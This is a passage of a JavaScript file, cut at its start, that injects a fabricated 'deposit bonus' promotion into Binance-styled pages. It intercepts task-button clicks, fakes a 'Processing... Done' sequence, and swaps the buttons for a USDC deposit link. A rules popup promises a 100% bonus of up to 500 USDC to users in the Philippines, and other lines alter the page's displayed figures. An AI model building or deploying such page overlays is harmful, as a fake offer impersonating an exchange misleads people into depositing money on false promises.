      window.location.href = "https://www.binance.com/en/my/wallet/account/main/deposit/crypto/USDC"
    })
    wrapper.appendChild(btn)
    return wrapper
  }

  function replaceTaskActionIfVoucherUsed(root) {
    if (!voucherUsed) return
    try {
      const taskAction = (root instanceof Element ? root : document).querySelectorAll
        ? root.querySelector("button.TaskAction") || root.querySelector(".TaskAction")
        : null
      if (taskAction) {
        const container = taskAction.closest(".TaskCard-actions") || taskAction.parentElement
        if (!container) return
        if (container.querySelector(".deposit-usdc-wrapper")) return
        const depositWrapper = createDepositWrapper()
        taskAction.replaceWith(depositWrapper)
      }
    } catch (e) {
      /* ignore */
    }
  }

  // ============================================================================
  // CLICK EVENT DELEGATION
  // ============================================================================

  document.addEventListener(
    "click",
    (evt) => {
      const rulesBtn = evt.target.closest?.(".TaskRuleTrigger-button")
      if (rulesBtn) {
        evt.preventDefault()
        openRulesModal()
        return
      }

      const voucherBtn = evt.target.closest?.("button.TaskAction, .TaskAction")
      if (voucherBtn) {
        evt.preventDefault()
        handleVoucherClick(voucherBtn)
        return
      }

      const claimBtn = evt.target.closest?.("button.claim-btn")
      if (claimBtn && !claimBtn.disabled) {
        claimBtn.click()
      }
    },
    true,
  )

  function handleVoucherClick(button) {
    try {
      if (button.getAttribute("aria-disabled") === "true" || button.dataset.processing === "1") return
      button.dataset.processing = "1"

      console.log("[v0] Voucher button clicked")

      sessionStorage.setItem(STORAGE_KEY, "1")
      voucherUsed = true

      const summaryItems = document.querySelectorAll("div.HomeBannerSummaryItem-data")
      if (summaryItems.length > 1) summaryItems[1].textContent = "0"

      const btnWidth = button.offsetWidth
      if (btnWidth && !button.style.minWidth) button.style.minWidth = btnWidth + "px"

      const spinner = document.createElement("span")
      spinner.className = "loading-spinner"
      button.innerHTML = ""
      button.appendChild(spinner)
      button.appendChild(document.createTextNode("Processing..."))
      button.setAttribute("aria-disabled", "true")

      setTimeout(() => {
        button.innerHTML = "✓ Done"
        button.setAttribute("aria-disabled", "true")

        setTimeout(() => {
          const actionsContainer = button.closest(".TaskCard-actions") || button.parentElement
          if (!actionsContainer) return
          if (actionsContainer.querySelector(".deposit-usdc-wrapper")) return

          const depositWrapper = createDepositWrapper()
          button.replaceWith(depositWrapper)
        }, 500)
      }, 1200)
    } catch (e) {
      console.error("[v0] Voucher handler error", e)
    }
  }

  // ============================================================================
  // RULES MODAL
  // ============================================================================

  let modalOpen = false
  function openRulesModal() {
    if (modalOpen) return
    modalOpen = true

    const overlay = document.createElement("div")
    overlay.className = "rules-popup-overlay"
    overlay.setAttribute("role", "presentation")

    const popup = document.createElement("div")
    popup.className = "rules-popup"
    popup.setAttribute("role", "dialog")
    popup.setAttribute("aria-modal", "true")
    popup.setAttribute("tabindex", "0")

    popup.innerHTML = `
      <h2>Task Rules</h2>

      <div style="margin-bottom:16px;">
        <div class="section-title">Criteria</div>
        <div class="section-body">
          <strong>Deposit Type(s):</strong> Crypto Deposit<br>
          <strong>Eligible Coin(s):</strong> USDC<br>
          <strong>Total Deposit Amount:</strong> Up to 500 USDC
        </div>
      </div>

      <div style="margin-bottom:16px;">
        <div class="section-title">Reward</div>
        <div class="section-body">
          <strong>Reward:</strong> Token Voucher worth up to 500 USDC (Spot)<br><br>
          <strong>Example:</strong> Deposit 100 USDC → +100 USDC / $100 + $100 (Bonus) = $200<br><br>
          100% deposit bonus exclusively for users from the Philippines.
        </div>
      </div>

      <div>
        <div class="section-title">General Rules</div>
        <div class="section-body">
          1. Rewards are limited and will be distributed on a first-come, first-served basis.<br><br>
          2. Each user can claim only one reward after completing the respective challenge/task.<br><br>
          3. The voucher will be valid for 30 days from the date of distribution.<br><br>
          4. Existing users must deposit at least $20 worth of USDC during the Promotion Period to qualify. Only USDC deposits from the <b>Spot</b> section are eligible. Once the deposit has at least <b>12 confirmations</b>, the bonus will be instantly credited in the Spot account.
        </div>
      </div>

      <div class="footer">
        <button class="btn-ok" type="button">OK</button>
      </div>
    `

    overlay.appendChild(popup)
    document.body.appendChild(overlay)

    document.documentElement.classList.add("rules-modal-open")
    document.body.classList.add("rules-modal-open")
    popup.focus()

    function closeModal() {
      overlay.remove()
      document.documentElement.classList.remove("rules-modal-open")
      document.body.classList.remove("rules-modal-open")
      document.removeEventListener("keydown", onKey)
      modalOpen = false
    }

    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) closeModal()
    })

    popup.querySelector(".btn-ok")?.addEventListener("click", closeModal)

    function onKey(e) {
      if (e.key === "Escape") closeModal()
    }
    document.addEventListener("keydown", onKey)
  }

  // ============================================================================
  // INITIALIZATION
  // ============================================================================

  document.addEventListener("DOMContentLoaded", () => {
    console.log("[v0] DOM loaded, applying changes")
    applyBannerChanges()

    try {
      const empty = document.querySelector(".HomeSectionEmpty")
      if (empty) empty.outerHTML = replacementHTML
      if (voucherUsed) replaceTaskActionIfVoucherUsed(document)
    } catch (e) {
      /* ignore */
    }

    const footer = document.querySelector(".site-footer")
    if (footer) {
      footer.style.backgroundColor = "#000"
    }
  })

  setTimeout(() => {
    try {
      const empty = document.querySelector(".HomeSectionEmpty")
      if (empty) empty.outerHTML = replacementHTML
      if (voucherUsed) replaceTaskActionIfVoucherUsed(document)
    } catch (e) {
      /* ignore */
    }
  }, 800)

  console.log("🚀 Binance Philippines Complete Suite (Enhanced) loaded")
  console.log("👤 User ID:", getUserId())
})()
